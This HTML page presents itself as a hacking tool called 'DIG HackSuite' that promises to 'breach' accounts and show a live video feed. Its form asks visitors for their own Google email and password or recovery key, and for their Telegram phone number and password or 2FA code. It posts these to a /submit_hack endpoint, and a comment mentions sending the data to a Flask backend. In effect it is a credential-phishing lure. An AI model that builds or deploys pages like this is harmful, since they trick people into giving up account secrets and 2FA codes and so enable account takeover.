<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIG HackSuite // Ultimate Digital Breach</title>
    <style>
        /* Basic CSS for a dark, hacking aesthetic */
        body { font-family: 'Consolas', monospace; background-color: #0a0a1a; color: #00ff00; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: #1a001a; padding: 30px; border: 3px solid #ff00ff; box-shadow: 0 0 20px #ff00ff; }
        h1 { color: #ff4444; text-align: center; text-shadow: 0 0 5px #ff0000; }
        .form-group { margin-bottom: 20px; padding: 15px; border: 1px dashed #00aaff; border-radius: 5px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #ffffff; }
        input[type="text"], input[type="password"] { width: calc(100% - 22px); padding: 10px; border: 1px solid #00ff00; background-color: #0d0d2e; color: #00ff00; box-sizing: border-box; }
        button { background-color: #ff0000; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 1.1em; transition: background-color 0.3s; }
        button:hover { background-color: #cc0000; box-shadow: 0 0 15px #ff0000; }
        #results { margin-top: 30px; padding: 20px; background-color: #050510; border: 2px solid #00ff00; }
        .video-container { width: 100%; margin-top: 15px; border: 3px solid #ffaa00; }
        .video-container video { width: 100%; height: auto; display: block; }
    </style>
</head>
<body>

<div class="container">
    <h1>SYSTEM OVERRIDE // DIG HACKSUITE V4.1</h1>
    <p style="text-align: center; color: #ffff00;">Enter credentials below to initiate full digital extraction.</p>

    <form id="hackForm" action="/submit_hack" method="POST">
        <!-- Google Account Section -->
        <div class="form-group">
            <label for="google_email">Google Account (Email):</label>
            <input type="text" id="google_email" name="google_email" required>
        </div>
        <div class="form-group">
            <label for="google_pass">Google Password (or Recovery Key):</label>
            <input type="password" id="google_pass" name="google_pass" required>
        </div>

        <!-- Telegram Section -->
        <div class="form-group">
            <label for="telegram_phone">Telegram (Phone/Username):</label>
            <input type="text" id="telegram_phone" name="telegram_phone" required>
        </div>
        <div class="form-group">
            <label for="telegram_pass">Telegram Password/2FA Code (if applicable):</label>
            <input type="password" id="telegram_pass" name="telegram_pass" required>
        </div>

        <!-- Action Button -->
        <button type="submit">INITIATE BREACH SEQUENCE</button>
    </form>

    <div id="results">
        <h2>// LIVE FEED //</h2>
        <p id="statusMessage">Awaiting submission...</p>

        <!-- Video Player for the "Live Video Stream" -->
        <div class="video-container">
            <video id="liveVideo" controls autoplay muted poster="placeholder_art.jpg">
                <!-- Source will be updated by JavaScript/Backend -->
                Your browser does not support the video tag.
            </video>
        </div>
    </div>
</div>

<script>
    // --- JavaScript Logic for Autoplay/Video Control ---
    document.addEventListener('DOMContentLoaded', function() {
        const videoElement = document.getElementById('liveVideo');

        // Set an initial placeholder source (this should ideally be dynamic)
        videoElement.src = 'sample_video.mp4'; // CHANGE THIS PATH

        // Force autoplay to the start
        videoElement.play();
    });

    // Optional: Add AJAX/Fetch to update status message dynamically
    document.getElementById('hackForm').addEventListener('submit', function(e) {
        e.preventDefault();
        // In a real setup, you'd send data to Flask endpoint and update statusMessage here
        document.getElementById('statusMessage').innerText = "Processing credentials... Do not refresh.";
    });
</script>

</body>
</html>
